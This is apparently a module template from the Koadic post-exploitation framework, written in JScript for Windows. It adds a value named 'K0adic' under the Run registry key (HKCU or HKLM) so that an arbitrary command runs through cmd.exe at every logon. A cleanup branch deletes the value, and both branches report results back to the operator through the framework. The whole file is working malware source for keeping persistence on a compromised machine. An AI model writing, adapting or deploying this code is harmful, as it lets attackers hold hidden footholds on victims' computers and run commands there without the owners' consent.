try
{

    var headers = {};
    var path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    var key = "K0adic";

    if (~CLEANUP~)
    {
        headers["Task"] = "DeleteKey";
        var hkey = ~HKEY~;
        var hkeyname = "";
        switch(hkey)
        {
            case 0x80000001:
                hkeyname = "HKCU";
                break;
            case 0x80000002:
                hkeyname = "HKLM";
                break;
            default:
                break;
        }
        var retval = Koadic.shell.exec("reg delete "+hkeyname+"\\"+path+" /v "+key+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        Koadic.work.report(retval, headers);
    }
    else
    {
        var comspec = Koadic.shell.exec("echo %comspec%", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        comspec = comspec.split(" \r\n")[0];
        Koadic.registry.write(~HKEY~, path, key, "\""+comspec+"\" /q /c ~CMD~", Koadic.registry.STRING);
        headers["Task"] = "AddKey";
        var retval = Koadic.registry.read(~HKEY~, path, key, Koadic.registry.STRING).SValue;
        Koadic.work.report(retval, headers);
    }

    Koadic.work.report("Complete");

}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
